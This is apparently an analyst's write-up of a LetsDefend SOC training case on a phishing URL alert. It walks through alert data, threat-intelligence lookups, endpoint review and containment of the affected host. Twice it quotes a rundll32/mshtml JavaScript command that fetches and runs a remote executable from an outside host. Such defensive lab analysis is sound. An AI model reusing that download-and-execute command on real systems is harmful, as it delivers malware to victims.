SOC141 - Phishing URL Detected
see results at :
https://app.letsdefend.io/case-management/casedetail/shakeco1/86

### Collection Data

Please check alert details fot belows.

- Source Address : 172.16.17.49
- Destination Address : 91.189.114.8
- User-Agent : Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36

### Analyze URL Address

Analyze URL in 3rd party tools. Please click "Malicious" if it is malicious and click "Non-malicious" if it isn't.

You can use the free products/services below.
- [AnyRun](https://app.any.run/) (buisness)
- [VirusTotal](https://www.virustotal.com/)
- [URLHouse](https://urlhaus.abuse.ch/browse/)
- [URLScan](https://urlscan.io/)
- [HybridAnalysis](https://www.hybrid-analysis.com/)
- [AbuseIPDB](https://www.abuseipdb.com/)


- When was it accessed? Mar, 22, 2021, 09:23 PM
- What is the source address? 172.16.17.49
- What is the destination address? 91.189.114.8
- Which user tried to access? Emily
- What is User Agent? Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36
- Is the request blocked? no

![[Pasted image 20250809174418.png]]

- **ה־Source** (המקור) → `172.16.17.49` (`EmilyComp`) — המחשב של **Emily** ברשת הפנימית שלך.
    
- **ה־Destination** (היעד) → `91.189.114.8` (`mogagrocol.ru`) — שרת זדוני באינטרנט (ברוסיה לפי הסיומת `.ru`).

AbuseIPDB :
![[Pasted image 20250809172204.png]]

virustotal:
![[Pasted image 20250809172350.png]]


it doesn't look like the IP adress is malicious 
lets check the URL now (http://mogagrocol.ru) :

![[Pasted image 20250809172554.png]]
 we can see 4/97 security vendors flagged this URL as malicious
 ![[Pasted image 20250809172649.png]]
 hybrid-analysis
![[Pasted image 20250809172837.png]]
urlscan.io
![[Pasted image 20250809172925.png]]


I will now check emily's computer and I see that a command has ran in the terminal 
![[Pasted image 20250809173229.png]]

rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')'

it seems like the computer might be infected with malware
![[Pasted image 20250809173319.png]]


now we will look if any other computers in our network communicated with this address (91.189.114.8)
![[Pasted image 20250809173829.png]]

we can see that only EmilyComp communicated with it.

we have contained emily's computer
untill further investigation 
![[Pasted image 20250809180645.png]]

Playbook Note:
on Mar, 22, 2021, 09:23 PM our SOC fired an alert of a suspected Phishing URL. our endpoint: Source Address : 172.16.17.49 Source Hostname : EmilyComp communicated with : Destination Address : 91.189.114.8 Destination Hostname : mogagrocol.ru Request URL : http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io after reviewing the endpoint it ran a script of the adress: rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')' the script called the following address: http://ru-uid-507352920.pp.ru/KBDYAK.exe therefore I containted the endpoint for further investigation.
